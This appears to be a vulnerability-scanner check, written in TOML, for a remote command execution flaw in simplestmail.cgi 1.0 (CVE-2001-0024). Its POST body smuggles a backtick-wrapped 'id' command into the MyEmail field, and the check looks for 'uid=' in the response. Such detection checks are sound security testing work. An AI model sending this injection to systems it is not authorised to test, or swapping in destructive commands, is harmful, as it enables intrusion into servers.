[info]
author = "ave"
description = "验证 simplestmail.cgi 1.0 的 MyEmail 参数是否存在远程命令执行漏洞，通过发送包含 shell 元字符的 POST 请求检测命令注入"
id = "POC-AVE-2001-0011"
name = "Leif M. Wright simplestmail.cgi Remote Command Execution PoC"
severity = "critical"
tags = ["ave-2001-0011"]
vuln_id = [
    "CVE-2001-0024",
    "AVE-2001-0011",
]

[poc]
logic = "all"

[[poc.requests]]
method = "POST"
path = "/cgi-bin/simplestmail.cgi"
protocol = "http"

[poc.requests.body]
content = "name=test&MyEmail=%60id%60"
type = "form"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = ["uid="]
